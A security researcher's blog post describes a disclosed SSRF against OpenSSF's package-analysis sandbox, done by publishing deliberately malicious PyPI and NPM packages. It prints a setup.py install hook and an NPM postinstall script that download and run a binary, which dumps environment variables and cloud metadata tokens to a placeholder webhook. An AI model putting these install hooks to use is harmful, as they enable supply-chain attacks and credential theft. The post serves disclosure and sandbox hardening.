---
title: Launching a Supply Chain Counterattack Against Google and OpenSSF
date: 2022-04-23
layout: post
tags: security cloud malware supply-chain bughunting
---

I dedicated some time to investigate and hunt for vulnerabilities involving *server side request forgery* (SSRF). **Server-Side Request Forgery** enables an attacker to make unsanitized queries against a public endpoint, which is then forwarded to an internal private service. This might result in the service performing some unintended and malicious actions, or return back sensitive metadata that can be used for further exfiltration.

Such an attack has become amplified as many services are now fully cloud-first. We see many vulnerability disclosures for SSRF often demonstrating impact by making queries against the service cloud provider’s internal *instance metadata endpoint.* This unique endpoint (which has been standardized by many cloud providers as 169.254.169.254) exists internally for code running on a container/VM to be able to grab basic information about the instance itself, such as its name, image, public SSH keys associated, etc. However, if an attacker is able to forward arbitrary requests inside the running service, this also inadvertently gives attackers the opportunity to grab authentication tokens, escalate privileges, and escape out of the environment they are in.

I decided to do some variant analysis of instance metadata-based SSRFs against a variety of targets that specialized in executing customer code as part of their services. This includes software like:

- Cloud-based Terminals
- Jupyter Notebooks
- IDEs (ie. for general development and interviewing)
- LaTeX Editors
- CI/CD Pipelines

While I was able to make some discoveries and disclosures, such as with the awesome [Gitpod](https://www.gitpod.io/security/thanks) service, I took some time to think a little more intently about some other services where it may not be as straightforward to do SSRF against, as many of the targets I tested simply involved running snippets of code to see if the instance metadata endpoints return something.

So after some thinking and research, I wanted to share a very interesting disclosure I made with Google, specifically with an organization that they, the Linux Foundation, and many others help create/sponsor, the [Open Source Security Foundation](https://openssf.org)! The work they all do, such as the package malware they [have already caught](https://github.com/ossf/package-analysis/blob/main/docs/case_studies.md), is very instrumental in both mitigating open-sourced threats in and bringing stronger supply chain security awareness to maintainers.

Before diving into the attack, let’s first start by examining the supply chain threat landscape, and how the security community has responded. 

## Supply Chain Insecurity

As I spent more time diving into the security research and tooling that has arisen as a result of package-based supply chain attacks in the wild, I became interested in seeing how a lot of detection pipelines have evolved to catch such unique malware. Two pieces work that stood out to me were [Jordan Wright](https://twitter.com/jw_sec)’s work in [finding malicious packages in PyPI](https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/) and Duan et Al.’s [NDSS paper](https://www.ndss-symposium.org/ndss-paper/towards-measuring-supply-chain-attacks-on-package-managers-for-interpreted-languages/), as both were really awesome in introducing scalable infrastructure to scrape and catch suspicious packages. 

Both implementations highlight the use of eBPF-based dynamic tracing, specifically with **[sysdig](https://github.com/draios/sysdig),** to capture syscall-based execution behaviors of packages during the installation process (since threat actors can often trigger malicious behaviors during the initial pulldown from the registry)**.** This makes sense, given the fact that creating static analysis rules takes effort (although new query languages like [CodeQL](http://codeql.github.com) and [Semgrep](https://r2c.dev) do help alleviate a lot of pain) and often suffers from the need for benchmarking their precision and recall. Thus with the rise of more convenient telemetry tooling powered by the eBPF subsystem, we can hypothesize that many organizations that are now pushing out package detection pipelines will rely more heavily on dynamic analysis traces to determine package badness, as it ultimately gives a more straightforward and definitive understanding of what packages do during the installation process.

## Sneak-y Around

From this hypothesis, this gave me the idea to write my own malicious packages, but instead of being purposed to do something sinister against a developer that installs our package, we instead counter-attack the vendors that implement the sandboxing environments themselves 😈. An overview of this attack chain can be observed in the following diagram:

![AttackChain](/assets/img/posts/SSRF.png){:class="img-fluid"}

To start, I wrote a piece of second-stage malware, which will get dropped and executed in these environments by the malicious package to enumerate for SSRF opportunities. It carries out the following workflow:

1. Do some initial fingerprinting by dumping out environment variables, which can help identify potential service/container names, and maybe even authorization tokens/secrets.
2. Make an initial request against known instance metadata endpoints to see if we receive a response
    1. If identified, make additional requests against the endpoint to drop sensitive credentials and make other enumerations. An example can be seen in the code [here](https://github.com/ex0dus-0x/sneak/blob/main/cloud.go#L131-L134), against the AWS IMDSv1 endpoint.
3. Enumerate for other outbound addresses the host we’re in can speak to (NOTE: this actually not yet implemented, but I’d imagine implementing a barebones netstat clone).
4. Exfiltrate all these results to a specified webhook URL we control.

You can play around with this Golang-based malware, which I dubbed sneak, [here](https://github.com/ex0dus-0x/sneak)! Simply running the binary will kick off the enumeration process, and specifying a `--webhook` flag will exfiltrate any results to a webhook URL that can consume any arbitrary request (I used [webhook.site](https://webhook.site/#!/faec153e-a214-474f-81c8-14a1bad77298)). One  feature I recently incorporated is being able to set that webhook input through build-time using `-ldflags`, which will bake that URL in to the resulting binary without needing to modify the source, which might be useful if one chooses to drop and execute the binary in a spot where command-line invocation is not allowed.

### Launching the Attack

I built an ELF of the binary, and placed it into the sneak repository’s [Releases](https://github.com/ex0dus-0x/sneak/releases/tag/prerelease), and wrote two “wrapper” packages for both [PyPI](https://pypi.org/project/intentionally-malicious/) and [NPM](https://www.npmjs.com/package/intentionally-malicious) called `intentionally-malicious`. The PyPI one looked something like this:

```python
"""
setup.py
"""
import os
import urllib.request
import ssl
from subprocess import Popen, PIPE, STDOUT

from setuptools import setup
from setuptools.command.install import install

ssl._create_default_https_context = ssl._create_unverified_context

MALWARE = "https://github.com/ex0dus-0x/sneak/releases/download/prerelease/sneak"
WEBHOOK = "https://<WEBHOOK_URL>.com/"

class IntentionallyMalicious(install):
    def run(self):
        fd = urllib.request.urlretrieve(MALWARE, "sneak", )
        os.system("chmod +x ./sneak")
        cmd = f'./sneak -webhook={WEBHOOK}'
        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        p.communicate()

setup(
    name="intentionally-malicious1",
    cmdclass={
        "install": IntentionallyMalicious
    },
    ...
)
```

Here, we adopt a similar approach to what many package attackers take, where malicious behavior gets triggered immediately when a `pip install` command is triggered, as one can introduce malicious arbitrary code to `setup.py`. We do the same with the NPM package, setting the `postinstall` field as part of the `package.json` manifest to trigger code as so:

```jsx
const request = require('request');
const fs = require('fs');
const exec = require('child_process').exec;

const url = "https://github.com/ex0dus-0x/sneak/releases/download/prerelease/sneak"
const file = fs.createWriteStream("sneak");
request({
  followAllRedirects: true,
  url: url
}, function (error, response, body) {
  request(url).pipe(file).on('close', function() {
    console.log("done");
    exec('chmod +x ./sneak && ./sneak -webhook=https://<WEBHOOK_URL>.com/')
      if (err) {
          console.log(err);
          return;
      }
      console.log(`stdout: ${stdout}`);
      console.log(`stderr: ${stderr}`);
    });
  });
});
```

After uploading both to their respective registries, I crossed my fingers and waited around for some detection infrastructures to pick them up, run them, and produce some interesting results. 

Initially, I saw some requests come in that did not yield anything that can enable me to perform further exploitation. However, after pushing up the NPM malware, one interesting request did come in:

![SSRF_out](/assets/img/posts/SSRF_out.png){:class="img-fluid"}

When examining the results, we see that an OAuth token is indeed dropped, and that the service account and project associated with them were from OpenSSF! When looking at the scopes that are present for the token, I noticed the `https://www.googleapis.com/auth/cloud-platform` scope present, meaning that we can escape that environment, and potentially have full access to enumerate and possibly takeover other resources available as part of that project! GitLab Security has a really nice post that discusses post-exploitation in GCP further, which you can read about [here](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/).

It seems that our malware was first picked up by the [ossf/package-feeds](https://github.com/ossf/package-feeds) project, which routinely watched for new packages in the NPM registry feed, saw our newly created package, and published the metadata to an analysis worker from the [ossf/package-analysis](https://github.com/ossf/package-analysis) project. This was what ultimately analyzed our package by spinning up a [Podman](https://podman.io)-based sandbox container to install it and perform dynamic analysis. The container didn’t restrict access to the instance metadata API, hence allowing me to launch such a counter-attack and dropping the token!

I immediately submitted a report to Google’s Vulnerability Reward Program, and after a very quick and smooth process, they were able to get several fixes into the package detection infrastructure, and awarded me with a bounty! While OpenSSF seems to be more autonomous and has kind of spun-off of Google, I believe that this was still considered in-scope by the team and subsequently awarded because the core package detection work was still being managed by Google engineers, and that privilege escalation with that OAuth token might’ve enabled one to escape and laterally move into other internal Google-managed infrastructure.

## Closing Thoughts

I think that this disclosure is not only interesting because of the unique service that SSRF was exploited in, but because it also leads into broader discussions about *security hardening in malware analysis pipelines.*

I believe it’s important to emphasize that any infrastructure or system that does some form of dynamic malware analysis, such as those deployed by OpenSSF, are themselves attack surfaces. Both industry and academic research have done a significant amount of work to understand anti-analysis and sandbox evasion by threat actors, with the goal of recognizing the techniques malware employs to slow down analysis and eventual attribution. However, I have not yet seen efforts that evaluate how such detection systems are hardened themselves, as future emerging threats may have intentions to target such security organizations, which can be done by abusing and exploiting these systems.

As such, I hope that this post creates awareness for security engineers building really important sandboxing/analysis technologies not to only focus their aim on protecting Internet users, but also themselves and the systems they build through releasing security audits and running adversarial simulations.

## Timeline

* March 2, 2022 - Initial discovery
* March 3, 2022 - Report disclosed to Google’s VRP
* March 10, 2022 - Vulnerability is triaged as Priority 1, Severity 1
* March 10, 2022 - After looking at the OAuth token, Google Security confirms and accepted the report
* March 23, 2022 - Patches are applied
* March 29, 2022 - VRP panel awarded a $1,337 bounty
